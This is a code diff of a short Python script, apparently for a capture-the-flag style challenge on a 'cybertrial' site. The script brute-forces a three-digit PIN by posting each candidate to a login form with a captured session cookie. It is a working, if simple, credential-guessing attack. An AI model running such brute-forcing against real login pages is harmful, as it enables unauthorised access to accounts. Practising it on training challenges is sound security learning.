@@ -2,14 +2,15 @@ import re
 import time
 import requests
 
+# Usage: add your cookie, set challenge number, highest number, and adjust the formatting for correct length on line 13
+
 challenge_number = 104
 cookie = // Capture valid cookie //
 highest_num = 999
-digits = 3
 
 for i in range(highest_num):
 
-    pin = '{0:0' + str(digits) + '}'.format(i)
+    pin = '{0:03}'.format(i)
     request = requests.post("http://" + str(challenge_number) + ".cybertrial.co.uk/login", data={"formgo": "1", "pin": pin}, cookies={"PHPSESSID": cookie})
 
     if(request.text.__contains__("403 Forbidden")):
